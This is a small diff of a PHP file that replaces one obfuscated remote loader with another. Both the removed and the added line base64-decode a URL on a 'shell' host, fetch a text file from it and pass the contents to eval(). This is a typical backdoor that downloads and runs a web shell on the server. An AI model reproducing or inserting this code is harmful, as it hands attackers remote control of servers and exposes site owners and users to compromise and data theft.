@@ -12,5 +12,5 @@
     return $data;
 }
 $x= '?>';
-      eval($x . get(base64_decode('aHR0cHM6Ly9zaGVsbC5wcmluc2guY29tL05hdGhhbi9hbGZhLnR4dA==')));
+      eval($x . get(base64_decode('aHR0cHM6Ly9zaGVsbC5wcmluc2guY29tL05hdGhhbi9zYXNrcmEudHh0')));
 ?>
